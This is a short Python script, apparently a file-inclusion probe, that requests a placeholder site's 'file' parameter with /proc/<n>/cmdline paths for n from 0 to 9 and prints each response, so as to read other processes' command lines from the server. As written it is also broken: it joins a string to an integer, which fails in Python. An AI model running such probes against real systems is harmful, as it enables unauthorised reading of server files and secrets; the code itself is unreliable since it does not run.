import requests
import time

for i in range(10):
    print(f"[+] Trying {i}")
    url = "http://example.com/?file=/proc/" + i + "/cmdline"
    resp = requests.get(url)
    print(resp.content)
    time.sleep(1)
